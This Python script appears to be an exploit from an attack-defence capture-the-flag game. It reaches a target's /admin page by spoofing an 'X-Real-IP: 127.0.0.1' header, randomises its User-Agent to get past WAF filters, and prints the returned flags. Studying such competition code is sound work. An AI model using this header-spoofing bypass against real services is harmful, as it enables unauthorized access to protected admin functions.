#!/usr/bin/env python3
import functools
import http
import json
import random
import string
import sys
import warnings
from typing import Any
from typing import Callable
from typing import Optional
from typing import Union

from colored import fore
from colored import style
from requests import Response
from requests import Session
from requests.exceptions import ConnectionError
from requests.exceptions import Timeout
from urllib3.exceptions import InsecureRequestWarning
from user_agent import generate_user_agent


NPC_HOST = 'NPC_HOST'
HOST = NPC_HOST if len(sys.argv) == 1 else sys.argv[1]
PORT = sys.argv[2]
URL = f'http://{HOST}:{PORT}'


def init_session(
    timeout_seconds: float = 5,
    verify_ssl_certificates: bool = False,
    is_response_logging_enabled: bool = True,
) -> Session:
    def create_wrapper(
        method: Union[str, bytes]
    ) -> Callable[[Union[str, bytes], Optional[Any]], Response]:
        def wrapper(url: Union[str, bytes], **kwargs: Optional[Any]) -> Response:
            try:
                return session.request(method, url, **kwargs)
            except ConnectionError:
                sys.exit(f'Connection error: {url}')
            except Timeout:
                sys.exit(f'Request timeout: {url}')

        return wrapper

    session = Session()

    # Override the default User-Agent to bypass WAF filters
    session.headers['User-Agent'] = generate_user_agent()

    session.request = functools.partial(
        session.request, timeout=timeout_seconds, verify=verify_ssl_certificates
    )

    if not verify_ssl_certificates:
        warnings.filterwarnings(
            action='ignore', category=InsecureRequestWarning, module='urllib3'
        )

    session.get = create_wrapper('get')
    session.put = create_wrapper('put')
    session.head = create_wrapper('head')
    session.post = create_wrapper('post')
    session.patch = create_wrapper('patch')
    session.delete = create_wrapper('delete')
    session.options = create_wrapper('options')

    if is_response_logging_enabled:
        session.hooks['response'].append(log_response)

    return session


# TODO: Code Review
def log_response(
    response: Response, *args: Optional[Any], **kwargs: Optional[Any]
) -> None:
    def pretty_format(headers: Any) -> str:
        return json.dumps(dict(headers), indent=4)

    status = fore.GREEN if response.ok else fore.RED

    request = response.request
    status_code = response.status_code

    try:
        reason = http.client.responses[status_code]
    except KeyError:
        reason = 'Unknown Status Code'

    print(f'{status}{request.method}{style.RESET} {request.url} â‡’ ', end='')
    print(f'{status}{status_code} ({reason}){style.RESET}')

    print(f'request.headers = {pretty_format(request.headers)}')
    print(f'response.headers = {pretty_format(response.headers)}')

    try:
        print(f'response.json = {pretty_format(response.json())}')
    except json.JSONDecodeError:
        print(f'{response.text = }')


def log_flags(response: Union[Response, Any]) -> None:
    content = response.text if isinstance(response, Response) else response
    print(f'{fore.VIOLET}{content}{style.RESET}', flush=True)


def gen_random_string(
    min_characters: int = 16,
    max_characters: int = 32,
    alphabet: str = string.ascii_letters + string.digits,
) -> str:
    string_length = random.randint(min_characters, max_characters)
    return ''.join(random.choices(alphabet, k=string_length))


session = init_session()

username = gen_random_string()
password = gen_random_string()

payload = {
    'username': username,
    'password': password,
}

r = session.get(f'{URL}/admin', headers={'X-Real-IP': '127.0.0.1'})
log_flags(r)

session.close()
